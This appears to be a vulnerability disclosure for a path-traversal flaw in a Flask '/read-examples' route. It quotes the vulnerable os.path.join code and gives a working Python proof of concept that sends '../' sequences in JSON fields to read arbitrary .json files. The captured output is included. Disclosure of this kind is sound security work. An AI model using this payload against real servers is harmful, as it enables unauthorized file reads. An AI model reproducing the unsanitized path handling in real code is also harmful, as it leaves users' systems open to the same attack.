# Description

`@_app.route("/read-examples", methods=["POST"])` uses `os.path.join(` to join a user-input path to a known path; resulting path traversal via ../

```python
@_app.route("/read-examples", methods=["POST"])
def _read_examples() -> Response:
    """
    Read tutorial examples from local file.
    """
    lang = request.json.get("lang")
    file_index = request.json.get("data")

    if not os.path.exists(
        os.path.join(
            _app.root_path,
            "static",
            "workstation_templates",
            f"{lang}{file_index}.json",
        ),
    ):
        lang = "en"

    with open(
        os.path.join(
            _app.root_path,
            "static",
            "workstation_templates",
            f"{lang}{file_index}.json",
        ),
        "r",
        encoding="utf-8",
    ) as jf:
        data = json.load(jf)
    return jsonify(json=data)

```

# Proof of Concept

```python
import requests

url_base = 'http://127.0.0.1:5000'
def read_example_lfi():
    return requests.post(
        url=f'{url_base}/read-examples',
        json={
            'lang':'/../../../..',
            'data':'/../../../../../../../../../../../../../poc/sensitive',
              }
    )


if __name__ == "__main__":
    print(read_example_lfi().content)
```

results in:

```yaml
╰─❯ python3 exp.py
b'{"json":{"you should not read this!":"retr0reg"}}\n'
```

# Impact

Read arbitary json file.